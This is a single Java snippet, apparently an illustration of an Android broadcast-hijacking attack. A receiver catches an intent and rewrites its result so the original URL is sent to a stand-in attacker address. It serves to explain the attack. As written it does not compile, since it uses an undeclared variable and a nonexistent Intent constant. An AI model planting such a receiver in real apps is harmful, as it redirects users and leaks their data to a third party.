
                  public class CallReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {String Url = intent.getStringExtra(Intent.URL_TO_OPEN);attackURL = "www.example.com/attack?" + Url;setResultData(attackURL);}}
               
               